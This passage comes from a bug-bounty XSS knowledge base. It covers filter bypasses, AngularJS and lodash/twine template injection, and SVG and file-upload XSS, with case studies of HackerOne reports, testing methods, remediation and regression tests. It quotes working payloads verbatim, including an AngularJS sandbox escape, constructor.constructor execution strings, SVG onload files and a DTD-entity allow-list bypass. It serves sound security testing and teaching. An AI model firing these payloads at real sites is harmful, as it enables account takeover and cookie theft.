at `https://kb.informatica.com/solution/4/Pages/7377.aspx`.

**Vulnerable code (quoted verbatim in the report):**
````js
strChild = "<a href='" + document.URL + "' style='color:#fff !important;font-size:10px'>Search Results</a>";
strChild = "<a href='" + varCoveoSearchResultPageURL + "' style='color:#999 !important;' >Search Results</a>";
strChild = "<a href='" + varDocumentReferrer + "' style='color:#999 !important;' >Search Results</a>";
strChild = "<a href='" + varStaticCoveoSearchResultPageURL + "' style='color:#999 !important;' >Search Results</a>";
````

**Root cause:** URL-derived values are concatenated into markup **with no encoding**,
inside single-quoted `href` attributes.

**Why it matters here:** `document.URL` contains the **fragment**, so a payload placed
after `#` never touches the server and still executes. See
[`DOM-Based-XSS.md`](../../DOM-Based-XSS.md).

---

#### Supporting filter-bypass sources (full bodies retrieved)

- **STOR-144** `232174` — <https://hackerone.com/reports/232174> — Shopify, high,
  $5,000. SVG allow-list bypassed by an internal DTD entity.
- **DOM-020** `247246` — <https://hackerone.com/reports/247246> — Grab, medium. Bypass
  of a previously added regex filter.
- **HTML-002** `6843` — <https://hackerone.com/reports/6843> — concrete5. Filter failure
  in `getMarketplacePurchaseFrame()`, with GitHub source links.
- **FILT-021** `126539` — <https://hackerone.com/reports/126539> — Shopify, $500.
  `signup=confirm(document.domain)` — a **boolean-based** injection, not even a tag
  break-out, proving no filtering at all on that parameter.
- **FILT-035** `186462` — <https://hackerone.com/reports/186462> — Shopify, $500. 'Buy
  Button' variant-title attribute.

### 12. Professional Vulnerability Report Template

`````markdown
# Filter bypass in <component> — <filter description> bypassed via <technique>

## Summary
<The control that exists, and precisely how the variant evades it.>

## Severity
<Rating as for the underlying XSS — a bypassed filter means no protection.>

## Affected endpoint
`GET|POST https://<host>/<path>` · Parameter: `<name>` · Program: <name>

## Vulnerability details
### The existing filter
<Where it lives, what it blocks, and the code if available.>

### Why it is bypassable
<Precise mechanism: regex non-match / Unicode lookalike / context mismatch / parser
differential / encoding depth.>

## Proof of concept
### Step 1 — baseline: the filter works
````
<parameter>=<original blocked payload>
````
> Result: **blocked / escaped.** (This proves a filter is present.)

### Step 2 — the bypass
````
<parameter>=<variant payload>
````
> Result: **executes in <origin>**. Screenshot / DOM excerpt attached.

### Step 3 — context confirmation
> Payload reads `document.domain` = `<origin>`.

## Remediation
<Context-appropriate output encoding; retire the blocklist. See §10.1.>

## Regression tests
<The specific probes that would have caught this bypass.>
`````

**Reporting discipline — non-negotiable.** Always include the blocked baseline. Say
plainly that this is a bypass of an existing control, not a fresh injection point.
Include the filter's code if you can find it. Do not propose a fix you have not
verified — `FILT-017`'s hex-encoding suggestion is the cautionary example.

### 13. References

- OWASP Cheat Sheet — Input Validation: <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- OWASP Cheat Sheet — XSS Prevention: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP — Unicode normalisation guidance (Appendix in Input Validation sheet): <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- OWASP — Internationalization character encoding: <https://owasp.org/www-project-internationalization/>
- OWASP XML External Entity Prevention (for the SVG/DTD case): <https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html>
- Unicode code charts: <https://unicode.org/charts/>
- Reports cited: <https://hackerone.com/reports/106293>, <https://hackerone.com/reports/2777>,
  <https://hackerone.com/reports/143323>, <https://hackerone.com/reports/189834>,
  <https://hackerone.com/reports/232174>, <https://hackerone.com/reports/247246>,
  <https://hackerone.com/reports/6843>, <https://hackerone.com/reports/126539>,
  <https://hackerone.com/reports/186462>, <https://hackerone.com/reports/231389>,
  <https://hackerone.com/reports/231444>

### 14. Research Gaps and Further Investigation

- **`REFL-082` (double encoding) body withheld.** The exact decode sequence remains a
  hypothesis. Highest-value single gap in this playbook.
- **`STOR-142` endpoint undisclosed.** The team described the filter defect precisely
  but not where it lived. Needed to build a targeted regression test.
- **Untested in this knowledge base:** mXSS (mutation XSS) via HTML-parser
  round-trips; template-injection-as-XSS in server-side template engines; encoding
  differentials between reverse proxies and origin servers; HTTP/2 or header-level
  double-decoding. None of these are well covered by 2017-era public reports.
- **Unicode coverage is thin.** `＜＞` and `‰€` are documented; the broader question —
  how many normalisation forms an application's filter must handle to be sound — is
  not answered by any source here. Worth original research.
- **Suggested experiment:** for a given target, submit an identical payload across
  NFC / NFKC / NFD and observe whether validation and rendering diverge. That single
  test distinguishes a sound implementation from an accidentally-working one.



---

<!-- PART 7 of 12 :: Framework-and-Template-XSS.md -->

## Framework and Template XSS

### 1. Overview

A template engine — client-side (AngularJS, lodash `_.template`, twine) or
server-side (Jinja2, Smarty) — that **evaluates user input as template source** rather
than treating it as data, executes attacker code. Output encoding does not help: the
input never passes through a data sink at all; it is *compiled*.

The archive contains only **4 sources** in this class, all with full report bodies. It
is the smallest playbook here, and the reason is structural rather than evidential:
HackerOne's weakness taxonomy has no "template injection XSS" category, so these land
in `XSS - Generic` and are scattered. They are collected here because they require
**materially different methodology** — you must recognise an evaluation sink, not an
output sink.

**Important scope distinction.** Template *injection* (expression evaluation) and
template *output* XSS (unescaped interpolation) are different bugs with different fixes.
This playbook covers the former. Server-side template injection that reaches RCE
belongs in an SSTI playbook, not here — see §9.

### 2. Root Cause and Technical Mechanics

````
attacker input  →  template engine compiler  →  expression evaluation  →  code execution
````

#### 2.1 Client-side template injection — AngularJS

`FRAM-001` (`125027`, Uber developer docs, $3,000) is the cleanest example in the
archive, and the researcher's minimal proof is excellent technique: a harmless
arithmetic payload.

`https://developer.uber.com/docs/deep-linking?q=wrtz{{7*7}}`

> "If you view the rendered source of the resulting page, you'll find the string
> `wrtz49`, showing the input has been evaluated."

`7*7 → 49` is the ideal confirmation: it proves evaluation without executing anything
dangerous, and it is impossible to explain as anything other than expression
evaluation. Any report claiming template injection should include an equivalent
non-executing arithmetic probe.

The researcher then supplied an Angular **sandbox escape** payload designed for
Internet Explorer 11:
````
q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
````

And — credit where due — cited prior art explicitly: *"Client-side template injection
vulnerabilities arise when applications using a client-side template framework
dynamically embed user input in web pages… For further information on this technique,
please refer to http://blog.portswigger.net/2016/01/xss-without-html-injection…"*

`FRAM-003` (`141463`, drchrono) is the **stored** variant of the same class. The
researcher supplied the same two-step proof — `[5*5]` rendering as `25` to establish
injection, then `[constructor.constructor('alert(1)')()]` for execution:

> "In the field for the address, if enter `[5*5]`, when the referrals contact overview
> will show the address as 25. This indicates an injection. Opening the browser console
> and using the command `angular.version`, we can see you are using 1.1.5."

Reporting the **framework version** is good practice and directly informs the fix.

#### 2.2 Template escapes in an escaping engine — lodash/twine

`FRAM-004` (`217790`, Shopify, high, $1,000) is the most technically precise report in
the entire knowledge base, and the model for how to report this class. The researcher's
chain of reasoning:

> "These UI elements are rendered from predefined templates using lodash's `_.template`
> method. While the method automatically provides input escaping the 'input' template
> (used by the `Shopify.API.Modal.input` method) assigns a value to a special
> `data-define` attribute. While it's not possible to escape the attribute context,
> because the escaping is **not fully context-aware** it is possible to inject additional
> data into the attribute which is later interpreted by twine. Because twine does not
> execute in a sandbox this template becomes an eval primitive and it possible to obtain
> XSS in the context of the parent application."

**Team summary, verbatim:**

> "This report demonstrated an XSS that could be exploited by a malicious application
> installed on a store to execute javascript as a store administrator. The cause of the
> XSS turned out to be **improperly escaped user input in a lodash template**."

The key insight is subtle and worth internalising: **the escaping was working as
designed, and the design was wrong.** Escaping was not context-aware, so a value that
was safe inside an HTML attribute became a *second* injection point once the attribute
was parsed and re-fed to twine. This is a template-injection vulnerability reached
*through* an escaping gap — the two categories intersecting.

#### 2.3 The arithmetic probe — the universal confirmation

Both AngularJS cases independently used the same technique. Generalise it:

| Engine | Inert evaluation probe | Expected output |
| --- | --- | --- |
| AngularJS (1.x) | `{{7*7}}` | `49` |
| AngularJS (2+/Ivy) | `{{7*7}}` | `49` (if `interpolation` is enabled) |
| lodash `_.template` | `${7*7}` | `49` |
| Jinja2 | `{{7*7}}` | `49` |
| Smarty | `{$smarty.version}` or `{7*7}` | version / `49` |
| Twig | `{{ 7*7 }}` | `49` |
| twine | engine-specific probe | — |

The probe matters: `{{7*7}}` echoed literally is **not** a finding, and `{{7*7}}`
rendering as `49` is a finding that no reviewer can argue with.

### 3. Attack Surface and Preconditions

| Surface | Case | Note |
| --- | --- | --- |
| Documentation search / query params | `FRAM-001` | AngularJS interpolation of a URL param |
| Contact / referral address fields | `FRAM-003` | stored, AngularJS 1.1.5 |
| Profile name fields | `FRAM-002` (`141240`, drchrono) | *"Angular injection in the profile name"* |
| Embedded-app SDK modal input | `FRAM-004` | lodash + twine in a parent-frame context |
| Admin widgets rendering user data | `FRAM-002` | same pattern, different field |

**Preconditions.**
- `FRAM-001`: none — a public docs page, a URL parameter.
- `FRAM-003`: permission to create a referral contact; **admin must view it** for
  impact. The researcher stated: *"The stored xss could be used for a complete account
  take over if an admin visited this contact page."*
- `FRAM-004`: a malicious embedded app must be **installed on a store**; the payload
  executes in the **store administrator's** session.

### 4. Manual Testing Methodology

1. **Identify the template engine.** Check for AngularJS (`angular.version` in the
   console — `FRAM-003` did exactly this), lodash/twine bundles, and framework
   fingerprint strings. Record the **version** — sandbox escape techniques are
   version-specific.
2. **Probe for interpolation with arithmetic, not code.**
   `?q=H1XSSMARKER{{7*7}}H1XSSMARKER` → if you see `H1XSSMARKER49H1XSSMARKER`, the
   input is being compiled as a template.
3. **Confirm the *rendered source*,** not the raw HTTP response. `FRAM-001`'s
   researcher checked "the rendered source of the resulting page" — correct, since a
   client-side engine never touches the HTTP response.
4. **Only then escalate** to an execution payload, and note the engine version in the
   report.
5. **For escaping-engine cases, look for a second sink.** If a template escapes into an
   attribute whose contents are later re-parsed (as `FRAM-004`'s `data-define` → twine),
   the escaping is bypassable by design. Trace where each emitted attribute is read.
6. **For embedded apps, establish the trust boundary first.** `FRAM-004` and `BROW-008`
   both concern malicious apps installed on an admin shop. Confirm in-scope
   installation is possible before reporting.

### 5. Input and Output Context Analysis

Template injection sidesteps the usual context table. The relevant contexts are:

| Context | What happens | Safe? |
| --- | --- | --- |
| Direct interpolation into a template body | expression evaluated | **no** |
| Interpolated, then HTML-escaped | expression still evaluated before escaping | **no** — escaping runs after evaluation |
| Escaped into an attribute, later **re-parsed** by another engine | second injection point (`FRAM-004`) | **no** |
| Passed as a *string value* into a template variable | inert data | **yes** |
| Used to *build* a template, then rendered | attacker controls the template | **no** |

The critical rule: **HTML-escaping does not prevent template injection.** In AngularJS
the expression is evaluated and only the *result* is inserted; `{{7*7}}` produces `49`,
and no amount of escaping of the source changes that. This is why the arithmetic probe
is decisive.

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

| Case | Report | Payload |
| --- | --- | --- |
| FRAM-001 | `125027` | `?q=wrtz{{7*7}}` (inert) and the sandbox-escape expression designed for IE 11 |
| FRAM-003 | `141463` | `[5*5]` (inert) then `[constructor.constructor('alert(1)')()]` |
| FRAM-004 | `217790` | twine injection via the `data-define` attribute of `Shopify.API.Modal.input` |

> **Handling note.** `FRAM-001`'s and `FRAM-003`'s execution payloads are reproduced
> here for historical analysis. They are sandbox-escape primitives specific to
> AngularJS 1.x and are shown for understanding, not for use. Use the inert arithmetic
> probe first; escalate only against authorised targets, and prefer
> `constructor.constructor('document.title="marker"')()`-style markers.

#### 6.2 Newly authored illustrations (not from the archive)

**Stage 1 — evaluation probe (no code execution).** Newly authored; the concept is
sourced from `FRAM-001`/`FRAM-003`.

````
?q=A{{7*7}}B        → expect A49B          (AngularJS)
?p=A${7*7}B         → expect A49B          (lodash _.template)
{{7*7}}                                   (Jinja2 / Twig server-side)
{$smarty.version}                         (Smarty)
````

`A`/`B` sentinels matter: they prove the value was *spliced into* a template rather
than echoed.

**Stage 2 — marker execution.** Newly authored.

````js
// Newly authored: execute a benign marker instead of an alert.
{{constructor.constructor('document.title="H1XSSMARKER9"')()}}
````

**Stage 3 — context, for reporting.**

````js
document.domain   // the origin in which the template evaluated
angular.version   // the engine version, for the fix
````

**Regression probe for escaping-engine second sinks.** Newly authored. Put a
sentinel into a value that lands in an attribute consumed by another engine, and check
whether it is re-parsed:

````
value = 'A" data-x="B'   →  does data-x appear as a *new* attribute or as text?
````

### 7. Encoding, Filtering, and Parsing Behavior

The distinctive behaviours:

| Behaviour | Case | Consequence |
| --- | --- | --- |
| Interpolation enabled on a user-controlled value | `FRAM-001`, `FRAM-003` | expression evaluated |
| Escaping applied *after* evaluation | `FRAM-002`, `FRAM-004` | escaping irrelevant |
| Escaping not context-aware; output re-parsed by a second engine | `FRAM-004` | escaping bypassable by design |
| Non-sandboxed secondary engine | `FRAM-004` | *"this template becomes an eval primitive"* |

`FRAM-004`'s phrase *"Because twine does not execute in a sandbox"* is the key
architectural point. A sandboxed template engine limits the blast radius of injected
expressions; a non-sandboxed one turns any injection into arbitrary code.

### 8. Impact and Severity Considerations

| Report | Program | Severity | Bounty |
| --- | --- | --- | --- |
| `217790` FRAM-004 | Shopify | high | $1,000 |
| `125027` FRAM-001 | Uber | not disclosed | $3,000 |
| `141463` FRAM-003 | drchrono | not disclosed | not disclosed |
| `141240` FRAM-002 | drchrono | not disclosed | not disclosed |

`FRAM-001` and `FRAM-004` bracket the range and both are explained by **who the
victim is**:

- `FRAM-001`: a public documentation page. No privileged viewer. $3,000 reflects the
  origin's trust and the demonstration of arbitrary expression evaluation.
- `FRAM-004`: *"could be exploited by a malicious application installed on a store to
  execute javascript as a store administrator."* An admin session is worth more than a
  docs page, and the report was rated **high**.

`FRAM-003`'s researcher made the same argument for their stored case: *"The stored xss
could be used for a complete account take over if an admin visited this contact page.
An attacker only needs permission to create a referral contact to store the payload."*

### 9. False Positives and Limitations

- **Echoed braces are not injection.** `{{7*7}}` appearing **literally** in the
  rendered page means no interpolation. Only a changed output is a finding.
- **Server-side template injection is not automatically XSS.** If a Jinja2/Smarty SSTI
  reaches code execution on the server, that is a **critical SSTI/RCE** finding, not an
  XSS. Do not downgrade it, and do not file it here — see §14.
- **Attribute-value injection is not necessarily template injection.** `FRAM-004` is
  both: an escaping gap *and* a re-parse into twine. If the second engine does not
  evaluate expressions, the same payload is only an attribute injection. Establish which
  one you have.
- **Version matters.** `FRAM-001`'s escape payload was explicitly *"designed to work in
  Internet Explorer 11"*. AngularJS 1.x sandbox escapes have been patched in later
  1.x releases and the framework is EOL. State the version and re-test.
- **Do not claim RCE from client-side template injection.** `FRAM-003`'s researcher was
  explicit about the *actual* ceiling: *"In the example image, I've printed all cookies
  to the screen but this could easily be sent to a remote endpoint"* — i.e. cookie
  exfiltration, no more.
- **In-scope prerequisites.** `FRAM-004` requires installing an app on a store.
  Confirm the program allows third-party apps before reporting.

### 10. Remediation and Regression Testing

#### 10.1 Remediation

- **Never compile user input as template source.** Pass it as a *variable value*, not as
  the template string. `_.template(source)` where `source` is user-controlled is an
  RCE-equivalent primitive.
- **AngularJS: do not enable interpolation on user data.** If legacy AngularJS is
  unavoidable, sanitise with `$sanitize` and treat that as defence in depth only.
  Prefer `$compile` on trusted templates with user data bound as scope variables.
- **Use context-aware escaping that understands the full downstream path.** If an
  attribute value is later re-parsed by another engine, the escaping must target *that*
  engine's syntax, not HTML.
- **Sandbox template engines** where possible, and restrict the available expression
  surface.
- **Upgrade off AngularJS 1.x.** It is end-of-life; sandbox escapes are a matter of
  version and time.
- **For embedded-app / cross-frame SDKs: validate values at the trust boundary,** and do
  not rely on per-widget escaping.

#### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| `?q=A{{7*7}}B` on every parameter rendered by a template engine | output is `A{{7*7}}B`, not `A49B` |
| Same for `${7*7}`, `{$…}`, `{…}` per detected engine | no interpolation |
| User input never passed as the template *string* to `_.template`/`compile` | no eval primitive |
| Attribute values checked for re-parse by a secondary engine (`FRAM-004`) | escaping context-aware |
| Template engine confirmed sandboxed; expression surface restricted | sandbox enforced |
| Stored variant: user A writes `A{{7*7}}B`, user B views | literal on every render path |
| Engine version recorded; escape payloads re-tested on that version | fix verified for the deployed version |

The first row is the single highest-value regression test for this class: it is cheap,
deterministic, non-executing, and catches the whole bug class.

### 11. Historical Bug Bounty Case Studies

Sourced facts only. All 4 sources retrieved with full bodies. Inventory:
[`references/source-index.md`](../../references/source-index.md).

---

#### FRAM-001 — Reflected XSS on developer.uber.com via Angular template injection

- **Program:** Uber · **Report:** <https://hackerone.com/reports/125027>
- **Archive listing:** <https://h1.security.nathan.sx/uber.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $3,000 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** `https://developer.uber.com/docs/deep-linking`, parameter `q`.

**Reproduction (as submitted) — the model report for this class:**
````
https://developer.uber.com/docs/deep-linking?q=wrtz{{7*7}}
````
> "If you view the rendered source of the resulting page, you'll find the string
> `wrtz49`, showing the input has been evaluated."

**Escalation (as submitted):** an Angular sandbox escape designed for IE 11 —
````
q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
````

**Methodological notes (reporter's own words):** *"This URL uses an Angular sandbox
escape to obtain arbitrary JavaScript execution and execute alert(1). It's designed to
work in Internet Explorer 11, but the technique could probably be used to target other
browsers given sufficient effort."* — an honest browser-scoping statement.

**Prior art cited by the reporter:** `http://blog.portswigger.net/2016/01/xss-without-html-injection`

---

#### FRAM-004 — XSS via twine template injection in Shopify.API.Modal.input

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/217790>
- **Archive listing:** <https://h1.security.nathan.sx/shopify.html>
- **Weakness:** `XSS - Generic` · **Severity:** high · **Bounty:** $1,000
- **Body inspected:** Yes — **full report**.

**Affected feature:** the Shopify **Embedded App SDK**, specifically the `input`
template rendered by `Shopify.API.Modal.input`, which runs in the context of the parent
admin page (`/admin/apps/$id`).

**Root cause (researcher, quoted in full in §2.2):** the `_.template` escaping is
*"not fully context-aware"*; the value lands in a `data-define` attribute which
*"is later interpreted by twine"*, and *"Because twine does not execute in a sandbox
this template becomes an eval primitive."*

**Team summary, verbatim:** *"This report demonstrated an XSS that could be exploited by
a malicious application installed on a store to execute javascript as a store
administrator. The cause of the XSS turned out to be improperly escaped user input in a
lodash template."*

**Precondition:** a malicious app installed on a store (the researcher identified the
app-install precondition explicitly).

---

#### FRAM-003 — Stored XSS via AngularJS Injection

- **Program:** drchrono · **Report:** <https://hackerone.com/reports/141463>
- **Archive listing:** <https://h1.security.nathan.sx/drchrono.html>
- **Weakness:** `XSS - Generic` · **Severity / Bounty:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the **address** field in
`https://<target>/messages/referrals/contacts/`; payload renders in the referrals
contact overview.

**Reproduction (as submitted) — the two-step proof, again the right shape:**
1. In the address field, enter `[5*5]`. *"When the referrals contact overview will show
   the address as 25. This indicates an injection."*
2. Enter `[constructor.constructor('alert(1)')()]`, save, reload — the alert fires.

**Engine identification (researcher):** *"Opening the browser console and using the
command `angular.version`, we can see you are using 1.1.5."*

**Impact as claimed:** *"The stored xss could be used for a complete account take over if
an admin visited this contact page. An attacker only needs permission to create a
referral contact to store the payload. In the example image, I've printed all cookies to
the screen but this could easily be sent to a remote endpoint."*

---

#### FRAM-002 — Angular injection in the profile name of onpatient

- **Program:** drchrono · **Case ID:** `FRAM-002` · **Report:**
  <https://hackerone.com/reports/141240>
- **Weakness:** `XSS - Generic` · **Severity / Bounty / date:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

Same program, same class, **different field** — the profile name rather than the
referral address. Filed by a different researcher. Retained as a separate case study
because it demonstrates a distinct field and therefore a distinct (per-field)
remediation, even though the root cause is identical.

---

#### Supporting note

A related but distinct program appears elsewhere in this knowledge base under
Framework-adjacent classification: `HTML-012` (`200826`, Algolia) and `HTML-011`
(`200753`, Ubiquiti) are both `github-btn.html` embeds where a `user` parameter is
read from `window.location` and written with `text.innerHTML = "Follow @" + user` —
an `innerHTML` DOM sink rather than a template-expression sink. See
[`HTML-Injection.md`](../../HTML-Injection.md) and
[`DOM-Based-XSS.md`](../../DOM-Based-XSS.md).

### 12. Professional Vulnerability Report Template

`````markdown
# Client-side template injection in <feature> via <parameter> — <engine> <version>

## Summary
<Parameter> is interpolated by <engine> and compiled as template source rather than
treated as data. Expression evaluation is confirmed by <arithmetic probe>, giving
arbitrary JavaScript execution in <origin>.

## Severity
<rating> — <viewer / origin trust>

## Affected endpoint
`https://<host>/<path>?<param>=` · Engine: <name> <version> · Program: <name>

## Vulnerability details
### Engine identification
````
$ angular.version
<version>
````

### Evaluation proof (no code execution)
````
https://<host>/<path>?<param>=A{{7*7}}B
````
> Rendered source contains `A49B` — the input is being evaluated as a template.

### Root cause
<Where user input reaches the compiler rather than a variable slot.>

## Proof of concept
### Inert evaluation
> (as above)

### Marker execution
````
?q={{constructor.constructor('document.title="H1XSSMARKER9"')()}}
````
> `document.title` is `H1XSSMARKER9`; execution in origin `<origin>`.

## Remediation
Never compile user input as template source; bind as a variable value. See §10.1.

## Regression tests
<The `A{{7*7}}B` assertion, plus the stored multi-user test if applicable.>
`````

**Reporting discipline.** Lead with the **arithmetic probe** — it is the strongest and
safest evidence in this class. Record the engine version. Check the *rendered source*,
not the HTTP response. Do not claim server-side code execution. State the viewer for
stored variants and test the multi-user path.

### 13. References

- PortSwigger — Client-side template injection: <https://portswigger.net/web-security/dom-based/client-side-template-injection>
- PortSwigger research cited by FRAM-001 — "XSS without HTML injection": <http://blog.portswigger.net/2016/01/xss-without-html-injection-1/>
- OWASP — DOM based XSS: <https://cheatsheetseries.owasp.org/cheatsheets/DOM_Based_XSS_Cheat_Sheet.html>
- AngularJS security guidance (note: AngularJS 1.x is EOL): <https://docs.angularjs.org/guide/security>
- AngularJS sandbox bypass research: <https://github.com/AngularJs/AngularJS>
- MDN — `_.template` / lodash documentation: <https://lodash.com/docs/4.17.4#template>
- Reports cited: <https://hackerone.com/reports/125027>, <https://hackerone.com/reports/217790>,
  <https://hackerone.com/reports/141463>, <https://hackerone.com/reports/141240>

### 14. Research Gaps and Further Investigation

- **Only 4 sources.** This is the smallest playbook here and the most under-sourced
  relative to how common the bug is. HackerOne's taxonomy has no template-injection-XSS
  category, so these reports are scattered across `XSS - Generic` — the inventory in
  [`references/source-index.md`](../../references/source-index.md) should be re-mined for
  `{{`, `${`, `{%`, `{#` in bodies to find more.
- **No server-side SSTI in this playbook, by design.** The archive does contain SSTI
  reports (e.g. `125027`'s sibling *"uber.com may RCE by Flask Jinja2 Template
  Injection"*, and *"Server side template injection via Smarty template allows for
  RCE"*), but those reach **server-side code execution** and are out of scope for an
  XSS knowledge base. **A dedicated SSTI playbook is the single largest missing piece
  in this knowledge base.**
- **Untested:** Angular 2+/Ivy interpolation; server-side rendering template injection;
  `_.template` `variable` option misuse; SSTI in email templates; second-order template
  injection via stored values.
- **Version staleness.** AngularJS is EOL and the sources are 2016–2017. The sandbox
  escape techniques documented here should be treated as historical; current
  client-side template injection is more likely to appear in modern SSR frameworks
  (Next.js, Nuxt, Svelte) where no source in this archive covers it.
- **Suggested original research:** sweep the archive's `XSS - Generic` bodies for
  template-expression syntax and re-file them into this playbook; that alone would
  likely double this category's evidence base.



---

<!-- PART 8 of 12 :: File-Upload-and-SVG-XSS.md -->

## File-Upload and SVG XSS

### 1. Overview

When a server accepts a file and later **serves it back under the site's own origin**,
the upload becomes an XSS primitive. This holds for SVG, for Flash (historical), and
for any format a browser will parse as active content.

The decisive variable is not the extension or the content — it is the **`Content-Type`
on the response when the file is served**. Serve an SVG as
`Content-Type: image/svg+xml` on your own origin and its `<script>` runs with your
origin's authority. Serve the identical bytes as `text/plain` and it is inert.

This is the one XSS class where the *correct* control is usually a response header
rather than input sanitisation, and the archive documents that conclusion directly.

### 2. Root Cause and Technical Mechanics

#### 2.1 The origin-confused upload

````
attacker uploads active-content file
   →  stored on target origin (or a trusted subdomain)
   →  victim opens the direct URL
   →  browser parses it as active content in the target origin
   →  script executes with that origin's authority
````

`FILE-007` (`100565`, Slack) is the canonical report and the best-written in the
archive. The attacker's SVG:

````xml
<svg width="100%" height="100%" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" onload="alert('script')">
  <script type="text/javascript"><![CDATA[
  // some exploit code here
  ]]></script>
  <circle cx="50" cy="50" r="50" fill="green" />
</svg>
````

The researcher's framing: *"A SVG script and other DOM elements is equivalent to the
elements in HTML, so in the example above `alert('script')` will be executed on svg
load event."*

#### 2.2 The `Content-Type` differential — the real control

`FILE-012` (`148853`, Paragon Initiative) makes the point explicitly and prescribes
the fix:

> "If you uploads any file thet can use for XSS (HTML,SWF,etc) the content type will
> change to `text/plain; charset=us-ascii`. But for images it will stay the same. so
> if you upload SVG with JS content it will work fine! The
> `Content-Type: image/svg+xml; charset=us-ascii` header will make this attack works."

And the team's own summary states the resolution:

> "The way browsers handle SVG files is terrible. If you're serving SVG files that your
> users can upload, **only allow them to be served as `text/plain`**."

**That single sentence is the correct remediation for the entire class.** It is
sourced, not inferred.

#### 2.3 Parser/validator differentials inside the file

`STOR-144` (Shopify, `$5,000`, high) — see
[`Stored-XSS.md`](../../Stored-XSS.md) §7 — showed a documented SVG element/attribute
allow-list being disabled by an internal DTD entity:

````xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [
    <!ENTITY elem "">
]>
<svg onload="alert(document.domain);" height="16" width="16">
  &elem;
</svg>
````

Here the control was an allow-list rather than a header, and the bypass was a
**parser differential**. Both approaches appear in this archive; the header approach is
strictly simpler.

#### 2.4 Mime-sniffing XSS on a download path

`CONT-129` (`126197`, Uber, $750) is the mirror image: the file is *not* meant to be
active content, but a browser sniffs it into being HTML.

The researcher's mechanism, verbatim: *"The MIME type of all the `.tar.gz` files is
`application/octet-stream`. Since the MIME type is not specified, browsers will
automatically try to determine the type of the file… Internet explorer scans the first
256 bytes of the file for `html` and if it finds `html` it will interpret the file as
HTML."*

PoC: build a `.tar.gz` containing `<html><script>alert(0)</script></html>` and upload
it to PyPI, mirrored by `archive.uber.com/pypi/simple/`.

**Controls here are `X-Content-Type-Options: nosniff` plus a real `Content-Type`.** The
IE-specific sniffing behaviour is historical; verify current-browser behaviour before
claiming impact, per §9.

#### 2.5 Historical Flash sub-class

Five sources in this group involve Flash (`.swf`), including
`66121` (VK.com, IE), `134546` (`*flashmediaelement.swf*`), `44512` (Vimeo moogaloop
player), `91421` (Imgur, `swfupload.swf`), `88508` (Vimeo captions), `182160`
(PortSwigger, IE11), `200351` (Zomato `flashmediaelement.swf`), and
`91421`'s cross-origin SWF upload on Imgur.

**Flash is end-of-life.** These cases are retained because the *methodology* — a
third-party script object (`.swf`) that can be pointed at an attacker's content —
survives in modern forms: browser extensions, WebAssembly modules, PDF viewers, and
`<object>`/`<embed>` embeds. Treat the Flash reports as historical evidence of the
pattern, not as current findings.

### 3. Attack Surface and Preconditions

| Surface | Case | Execution origin |
| --- | --- | --- |
| File upload served on a trusted file domain | `FILE-007` (slack-files.com), `FILE-018` (`community.ubnt.com`), `FILE-012` | the file domain |
| Image galleries | `FILE-018` (Ubiquiti), `FILE-*` (Paragon airship) | the gallery host |
| Avatar / profile images | `FILE-*` | the serving origin |
| App icons (SVG) | `STOR-144` | `partners.shopify.com` + shop admin |
| Package mirrors / downloads | `CONT-129` | the mirror origin |
| Third-party media players | Flash group | any embedding page |

**Preconditions.** Usually just: upload a file, then get a victim to open its direct
URL. `FILE-007` adds a distribution step — the file must be shared to a victim via a
channel or DM, and *"this file can be shared via public link"*, after which the victim
must click the preview.

**A subdomain is not a mitigation by default.** `FILE-007`'s researcher engaged with
this directly and concluded it is a weak control: *"Although `slack-files.com` is a
sandbox domain, there are many ways to gain the victim's trust during phishing attack.
For example, an attacker might render a fake log-in form with 'You need to sign in to
see this file' message."*

### 4. Manual Testing Methodology

1. **Map every upload point** — images, avatars, attachments, exports, imports, icons,
   "custom logo", "theme file".
2. **Upload an SVG with a harmless `onload`** as the first test, since SVG survives most
   image pipelines:
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg" onload="document.title='xss-marker'" width="1" height="1"/>
   ```
3. **Request the file's direct URL** and inspect the response headers:
   ```bash
   # newly authored — run against an authorised target
   curl -sI "$UPLOADED_FILE_URL"
   ```
   Record: `Content-Type`, `Content-Disposition`, `X-Content-Type-Options`.
4. **Judge by the header, not by the extension.** `image/svg+xml` → exploitable.
   `text/plain` → inert. `application/octet-stream` + `nosniff` → inert.
5. **Test the DTD/entity bypass** if the app allow-lists SVG attributes:
   `<!DOCTYPE svg [<!ENTITY elem "">]>` plus `onload=`.
6. **Test the extension/rename differential.** `BROW-006` (`191380`, Twitter,
   `$1,680`) changed `.jpg` → `.html` on the served path and got script execution.
7. **Test mime-sniffing** by embedding HTML-ish bytes at the start of a binary upload;
   confirm whether `nosniff` is present.
8. **Test the sandbox subdomain argument yourself** — check what cookies, storage and
   origins are reachable from the file domain. Do not assume "sandbox" means "isolated".

### 5. Input and Output Context Analysis

The "context" here is the **response context** the browser assigns to the file:

| Served as | Browser behaviour | Result |
| --- | --- | --- |
| `image/svg+xml` | parsed as XML/SVG | **active** — `<script>`, `onload`, `<a href="javascript:">` |
| `text/html` | parsed as HTML | **active** |
| `application/xhtml+xml` | parsed as XHTML | **active** |
| `text/plain` | displayed | inert |
| `application/octet-stream` **with** `nosniff` | downloaded | inert |
| `application/octet-stream` **without** `nosniff` | sniffed | possibly active — see `CONT-129` |
